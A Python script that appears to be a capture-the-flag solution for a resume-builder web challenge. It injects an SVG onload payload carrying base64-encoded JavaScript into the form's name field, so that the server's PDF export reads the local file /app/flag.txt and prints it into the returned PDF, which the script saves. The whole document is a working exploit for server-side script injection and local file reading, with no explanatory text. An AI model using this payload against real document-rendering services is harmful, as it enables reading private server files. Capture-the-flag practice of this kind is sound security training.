import requests
import base64

js = """const outputElement = document.getElementById("output");
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///app/flag.txt", true);
xhr.onload = function () {
  outputElement.textContent += xhr.responseText + "\\n";
}
xhr.send();""".encode()
payload = f"<pre id='output'></pre><svg onload=eval(atob('{base64.b64encode(js).decode()}'))>"

# From Burp "copy as python requests" extension
burp0_url = "http://we-need-you.web.jeanne-hack-ctf.org/resume"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded",
}
burp0_data = {
    "name": payload,
    "email": "placeholder@domain.com",
    "phone": "placeholder",
    "address": "placeholder",
    "job1_title": "placeholder",
    "job1_company": "placeholder",
    "job1_start": "2024-01-01",
    "job1_end": '',
    "job1_description": "Placeholder",
    "edu1_title": "placeholder",
    "edu1_school": "placeholder",
    "edu1_start": "2024-01-01",
    "edu1_end": "2024-01-01",
    "skills": "Placeholder",
    "languages": "Placeholder",
    "action": "export"
}
r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

with open("resume.pdf", "wb") as f:
    f.write(r.content)
